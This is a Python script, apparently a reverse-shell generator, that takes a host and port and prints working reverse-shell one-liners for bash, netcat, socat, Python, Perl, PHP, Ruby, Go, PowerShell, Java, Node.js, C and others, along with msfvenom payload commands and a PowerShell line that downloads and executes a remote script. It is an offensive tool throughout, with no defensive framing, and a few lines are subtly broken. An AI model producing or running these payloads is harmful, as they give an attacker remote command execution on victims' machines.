from colorama import Fore,init
import argparse

init(wrap=True,autoreset=True)

class main(object):
    def __init__(self):
        self.commands={"bash tcp":["bash -i >& /dev/tcp/{host}/{port} 0>&1","0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196"],"bash udp":["bash -i >& /dev/udp/{host}/{port} 0>&1\nListen port:nc -u -lvp {port}"],
                       "socat":["socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}'\nListen:socat file:`tty`,raw,echo=0 TCP-L:{port}"],
                         "perl":["""perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))JACKTWOopen(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");JACKONEopen;'""","""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{host}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""],
                       "python":["""ipv4\nexport RHOST="{host}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")""",
                                 """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""",
                                 """ipv6\npython -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("{ipv6}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'"""],
                       "php":["""php -r '$sock=fsockopen("{host}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""",
                              """php -r '$sock=fsockopen("{host}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'""",
                              """php -r '$sock=fsockopen("{host}",{port});`/bin/sh -i <&3 >&3 2>&3`;'""",
                              """php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""",
                              """php -r '$sock=fsockopen("{host}",{port});system("/bin/sh -i <&3 >&3 2>&3");'""",
                              """php -r '$sock=fsockopen("{host}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");'""",
                              """php -r '$sock=fsockopen("{host}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");'"""],
                       "Ruby":["""ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""","""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{host}","{port}");while(cmd=c.gets);IO.popen(cmd,"r")JACKONE|io|c.print io.readJACKTWOend'"""],
                       "Golang":["""echo 'package main;import"os/exec";import"net";func main()JACONEc,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()JACKTWO' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""],
                       "nc":["""nc -e /bin/sh {host} {port}""","""nc -c bash {port} {port}""","""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"""],
                       "ncat":["""ncat {host} {port} -e /bin/bash""","""ncat --udp {host} {port} -e /bin/bash"""],
                       "OpenSSL":["""openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes&&openssl {host} -quiet -key key.pem -cert cert.pem -port {port}""",
                                  """mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {host}:{port} > /tmp/s; rm /tmp/s""",
                                  """Listen:ncat --ssl -vv -l -p {port}\nnc --ssl -vv -l -p {port}"""],
                       "Powershell":["""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%JACKONE0JACKTWO;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)JACKONE;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()JACKTWO;$client.Close()""",
                                     '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%JACKONE0JACKTWO;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)JACKONE;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()JACKTWO;$client.Close()"''',
                                     """powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')"""],
                       "awk":["""awk 'BEGIN JACKONEs = "/inet/tcp/0/{host}/{port}"; while(42) JACKONE doJACKONE printf "shell>" |& s; s |& getline c; if(c)JACKONE while ((c |& getline) > 0) print $0 |& s; close(c); JACKTWO JACKTWO while(c != "exit") close(s); JACKTWOJACKTWO' /dev/null"""],
                       "java":["""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()""","""String host="{host}";
int port={port};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())JACKONEwhile(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try JACKONEp.exitValue();break;JACKTWOcatch (Exception e)JACKONEJACKTWOJACKTWO;p.destroy();s.close();
"""],"war":["Attack:msfvenom -p java/jsp_shell_reverse_tcp LHOST={host} LPORT={port} -f war > reverse.war"],
                       "lua":['''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{host}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"'''],
                       "nodejs":["""(function()JACKONE
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({port}, "{host}", function()JACKONE
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    JACKTWO);
    return /a/; // Prevents the Node.js application form crashing
JACKTWO)();""","""require('child_process').exec('nc -e /bin/sh {host} {port}')"""],
                       "Groovy":["""String host="{host}";
int port={port};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())JACKONEwhile(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try JACKONEp.exitValue();break;JACKTWOcatch (Exception e)JACKONEJACKTWOJACKTWO;p.destroy();s.close();"""],
                       "C":["""#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void)JACKONE
    int port = {port};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{host}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = JACKONE"/bin/sh", NULLJACKTWO;
    execve("/bin/sh", argv, NULL);

    return 0;       
JACKTWO"""],
                       "Meterpreter Shell":["""msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > reverse.exe
msfvenom -p windows/shell_reverse_tcp LHOST={host} LPORT={port} -f exe > reverse.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f elf >reverse.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST={host} LPORT={port} -f elf >reverse.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{host}" LPORT={port} -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST="{host}" LPORT={port} -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST="{host}" LPORT={port} -f macho > shell.macho
msfvenom -p windows/meterpreter/reverse_tcp LHOST="{host}" LPORT={port} -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="{host}" LPORT={port} -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="{host}" LPORT={port} -f war > shell.war
msfvenom -p cmd/unix/reverse_python LHOST="{host}" LPORT={port} -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST="{host}" LPORT={port} -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST="{host}" LPORT={port} -f raw > shell.pl
msfvenom -p php/meterpreter_reverse_tcp LHOST="{host}" LPORT={port} -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php"""]}

    def create(self,host,port):
        for j in self.commands:
            numbers = list(map(int, host.split('.')))
            ipv6='2002:{:02x}{:02x}:{:02x}{:02x}::'.format(*numbers)
            print(Fore.GREEN+j)
            for data in self.commands[j]:
                data=data.format(host=host,port=port,ipv6=ipv6).replace("JACKONE","{").replace("JACKTWO","}")
                print(data)
                print('')

if __name__ == '__main__':
    obj=main()
    arg=argparse.ArgumentParser()
    arg.add_argument('-i','--host',help='host')
    arg.add_argument('-p','---port',help='port')
    option=arg.parse_args()
    if option.host and option.port:
        obj.create(option.host,option.port)
    else:
        arg.print_help()
        print("python createshell.py -i <host> -p <port>")